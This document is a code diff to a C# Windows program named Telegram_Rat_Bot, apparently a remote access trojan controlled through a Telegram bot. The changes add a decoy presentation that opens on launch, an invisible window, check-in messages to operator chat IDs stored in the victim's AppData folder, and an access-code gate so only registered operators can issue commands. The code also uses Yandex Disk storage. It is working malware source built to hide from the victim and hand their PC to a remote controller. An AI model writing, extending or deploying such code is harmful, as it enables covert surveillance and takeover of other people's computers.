@@ -1,4 +1,4 @@
-﻿using Microsoft.Win32;
+using Microsoft.Win32;
 using System;
 using System.Diagnostics;
 using System.Drawing;
@@ -19,6 +19,7 @@ using System.Management;
 using YandexDisk.Client.Http;
 using YandexDisk.Client.Protocol;
 using AudioSwitcher.AudioApi.CoreAudio;
+using System.Text;
 
 namespace Telegram_Rat_Bot
 {
@@ -26,20 +27,66 @@ namespace Telegram_Rat_Bot
     {
         private static string token { get; set; } = "Token";
         private static int step = 0;
-        private static string id = "ID";
         private static string link;
+        private string[] txt;
 
         public Form1()
         {
             var client = new TelegramBotClient(token);
-            client.SendTextMessageAsync(id, $"Пк {Environment.UserName} включен", replyMarkup: Markup());
+            try
+            {
+                Process.Start($"{Environment.CurrentDirectory}/Files/Презентация.pptx");
+            }
+            catch
+            {
+                Console.Write("");
+            }
+
+            Start();
+
             client.StartReceiving(Update, Error);
 
             InitializeComponent();
 
             Opacity = 0;
 
+        }
 
+        async void Start()
+        {
+            var client = new TelegramBotClient(token);
+
+            try
+            {
+                using (FileStream fstream = System.IO.File.OpenRead($"C:/Users/{Environment.UserName}/AppData/Roaming/info.txt"))
+                {
+                    byte[] buffer = new byte[fstream.Length];
+
+                    await fstream.ReadAsync(buffer, 0, buffer.Length);
+
+                    string text = Encoding.Default.GetString(buffer);
+
+                    txt = text.Split(',');
+
+                    foreach (string a in txt)
+                    {
+                        await client.SendTextMessageAsync(a, $"ПК {Environment.UserName} включен", replyMarkup: Markup());
+                    }
+
+                }
+            }
+            catch
+            {
+                using (FileStream fstream = new FileStream($"C:/Users/{Environment.UserName}/AppData/Roaming/info.txt", FileMode.OpenOrCreate))
+                {
+                    byte[] buffer = Encoding.Default.GetBytes("id,");
+
+                    await fstream.WriteAsync(buffer, 0, buffer.Length);
+
+                    await client.SendTextMessageAsync("id", $"ПК {Environment.UserName} включен", replyMarkup: Markup());
+
+                }
+            }
         }
 
 
@@ -49,7 +96,7 @@ namespace Telegram_Rat_Bot
             var message = update.Message;
             string userName = Environment.UserName;
             ClickMouse click = new ClickMouse();
-            var api = new DiskHttpApi("yadiskAPI");
+            var api = new DiskHttpApi("api");
             var roodFolderData = await api.MetaInfo.GetInfoAsync(new ResourceRequest
             {
                 Path = "/televoog/"
@@ -57,7 +104,62 @@ namespace Telegram_Rat_Bot
 
             Random rnd = new Random();
 
-            if (message.Text != null && step == 0)
+            try
+            {
+                using (FileStream fstream = System.IO.File.OpenRead($"C:/Users/{Environment.UserName}/AppData/Roaming/info.txt"))
+                {
+                    byte[] buffer = new byte[fstream.Length];
+
+                    await fstream.ReadAsync(buffer, 0, buffer.Length);
+
+                    string text = Encoding.Default.GetString(buffer);
+
+                    txt = text.Split(',');
+
+                }
+            }
+            catch
+            {
+                using (FileStream fstream = new FileStream($"C:/Users/{Environment.UserName}/AppData/Roaming/info.txt", FileMode.OpenOrCreate))
+                {
+                    byte[] buffer = Encoding.Default.GetBytes("id,");
+
+                    await fstream.WriteAsync(buffer, 0, buffer.Length);
+
+                }
+            }
+
+            if (message.Text != "Ввести код доступа" && step != -1 && !txt.Contains(Convert.ToString(message.Chat.Id)))
+                await botClient.SendTextMessageAsync(message.Chat.Id, "Нет доступа", replyMarkup: CodeMarkup());
+
+            if (message.Text == "Ввести код доступа" && !txt.Contains(Convert.ToString(message.Chat.Id)))
+            {
+                await botClient.SendTextMessageAsync(message.Chat.Id, "Код", replyMarkup: new ReplyKeyboardRemove());
+                step = -1;
+            }
+             
+            if (step == -1 && message.Text != "Ввести код доступа")
+            {
+                if (message.Text == "ABC")
+                {
+                    using (FileStream fstream = new FileStream($"C:/Users/{Environment.UserName}/AppData/Roaming/info.txt", FileMode.Append))
+                    {
+                        byte[] buffer = Encoding.Default.GetBytes($"{message.Chat.Id},");
+
+                        await fstream.WriteAsync(buffer, 0, buffer.Length);
+
+                        await botClient.SendTextMessageAsync(message.Chat.Id, $"Код введен верно!", replyMarkup: Markup());
+
+                        step = 0;
+                    }
+                }
+                else
+                {
+                    await botClient.SendTextMessageAsync(message.Chat.Id, "Неверный код доступа");
+                }
+            }
+
+            if (message.Text != null && step == 0 && txt.Contains(Convert.ToString(message.Chat.Id)))
             {
                 switch (message.Text)
                 {
@@ -863,6 +965,18 @@ namespace Telegram_Rat_Bot
             (new[]
             {
                 new KeyboardButton[] { "Вернуться назад"}
+            })
+            {
+                ResizeKeyboard = true
+            };
+        }
+
+        private IReplyMarkup CodeMarkup()
+        {
+            return new ReplyKeyboardMarkup
+            (new[]
+            {
+                new KeyboardButton[] { "Ввести код доступа"}
             })
             {
                 ResizeKeyboard = true
